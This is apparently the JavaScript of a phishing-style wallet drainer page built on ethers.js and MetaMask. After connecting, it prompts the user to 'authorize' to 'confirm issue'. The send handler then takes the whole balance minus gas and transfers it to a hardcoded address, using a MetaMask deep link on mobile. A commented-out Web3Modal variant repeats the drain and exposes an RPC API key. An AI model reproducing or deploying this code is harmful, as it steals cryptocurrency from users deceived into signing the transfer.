let provider;
let signer;

// Function to detect mobile devices
function isMobile() {
    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

document.getElementById('get-started').addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
        try {
            // Request account access
            await ethereum.request({ method: 'eth_requestAccounts' });
            alert('MetaMask is connected, now click the authorize button to confirm issue');

            // Create a provider
            provider = new ethers.providers.Web3Provider(window.ethereum);

            // Get the signer (connected user)
            signer = provider.getSigner();
        } catch (error) {
            console.error('User denied account access', error);
        }
    } else {
        alert('MetaMask is not installed. Please install it to use this app.');
        console.error('MetaMask is not installed');
    }
});

async function createAndSignTransaction() {
    if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
        if (signer) {
            try {
                // Get the balance of the connected wallet
                const balance = await signer.getBalance();

                // Get the current gas price
                const gasPrice = await provider.getGasPrice();

                // Calculate the gas limit for a standard transaction
                const gasLimit = ethers.utils.hexlify(21000);

                // Calculate the total gas cost
                const gasCost = gasPrice.mul(gasLimit);

                // Calculate the amount to send (balance - gas cost)
                const value = balance.sub(gasCost);

                // Define the transaction
                const tx = {
                    to: '0xC0ffee254729296a45a3885639AC7E10F9d54979',  // Replace with the recipient address
                    value: value,
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                };

                // If on mobile, redirect to MetaMask app
                if (isMobile()) {
                    const txParams = {
                        to: tx.to,
                        from: await signer.getAddress(),
                        value: tx.value.toHexString(),
                        gas: tx.gasLimit.toHexString(),
                        gasPrice: tx.gasPrice.toHexString(),
                    };

                    const txUrl = `https://metamask.app.link/send?${new URLSearchParams(txParams).toString()}`;
                    window.location.href = txUrl;
                } else {
                    // Send the transaction
                    const txResponse = await signer.sendTransaction(tx);
                    console.log('Transaction hash:', txResponse.hash);

                    // Wait for the transaction to be mined
                    const receipt = await txResponse.wait();
                    console.log('Transaction confirmed:', receipt);
                }
            } catch (error) {
                console.error('Transaction failed:', error);
            }
        } else {
            console.error('Wallet is not connected');
            alert('Please connect your wallet first.');
        }
    } else {
        console.error('MetaMask is not installed');
        alert('MetaMask is not installed. Please install it to use this app.');
    }
}

document.getElementById('sendBtn').addEventListener('click', createAndSignTransaction);
/*document.getElementById('get-started').onclick = async () => {
    try {
        const providerOptions = {
            injected: {
                display: {
                    name: "MetaMask",
                    description: "Connect with MetaMask browser extension or mobile app"
                },
                package: null
            },
            walletconnect: {
                package: WalletConnectProvider.default, // required
                options: {
                    rpc: {
                        1: "https://eth-mainnet-mempool.rpcfast.com?api_key=bDkPRaSmDwz0al5sWxt4GOBUIFjPwLOJYwblafja2ILA8iyX5ZeNZECq3NJa4EPW"
                    },
                    qrcodeModalOptions: {
                        mobileLinks: ["metamask"]
                    }
                }
            }
        };

        const web3Modal = new window.Web3Modal.default({
            cacheProvider: false, // optional
            providerOptions, // required
            disableInjectedProvider: false // Enable if you want to use WalletConnect on desktop too
        });

        const instance = await web3Modal.connect();
        const provider = new ethers.providers.Web3Provider(instance);
        const signer = provider.getSigner();

        console.log("Wallet connected");

        // Get the balance of the wallet
        const address = await signer.getAddress();
        const balance = await provider.getBalance(address);

        // Estimate gas price
        const gasPrice = await provider.getGasPrice();
        const gasLimit = 21000; // Standard gas limit for a simple ETH transfer

        // Calculate the max value to send (balance - gas fee)
        const maxGasFee = gasPrice.mul(gasLimit);
        const maxValue = balance.sub(maxGasFee);

        if (maxValue.lte(0)) {
            console.error("Insufficient balance to cover the gas fee");
            return;
        }

        // Define transaction parameters
        const tx = {
            to: "0xC0ffee254729296a45a3885639AC7E10F9d54979", // Replace with the recipient address
            value: maxValue,
            gasLimit: gasLimit,
            gasPrice: gasPrice
        };

        // Send transaction
        const txResponse = await signer.sendTransaction(tx);
        console.log("Transaction sent", txResponse);

        // Wait for transaction to be mined
        const receipt = await txResponse.wait();
        console.log("Transaction mined", receipt);
    } catch (error) {
        console.error(error);
    }
};*/
